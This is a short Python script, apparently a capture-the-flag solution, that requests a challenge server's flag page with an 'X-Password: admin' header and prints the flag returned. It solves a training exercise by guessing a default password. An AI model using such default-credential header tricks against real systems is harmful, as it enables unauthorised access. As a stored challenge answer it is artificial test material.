#!/usr/bin/python3
#script made by LunarStone292

import requests as r
from colorama import Fore

headers = {'X-Password': 'admin'}
url = "http://web-03.challs.olicyber.it/flag"

def main():
    message = r.get(url, headers=headers).text
    return message

if __name__ == "__main__":
    message = main()
    print("[" + Fore.GREEN + "+" + Fore.RESET + "]" + Fore.GREEN + " Flag: " + Fore.YELLOW + message + Fore.RESET)
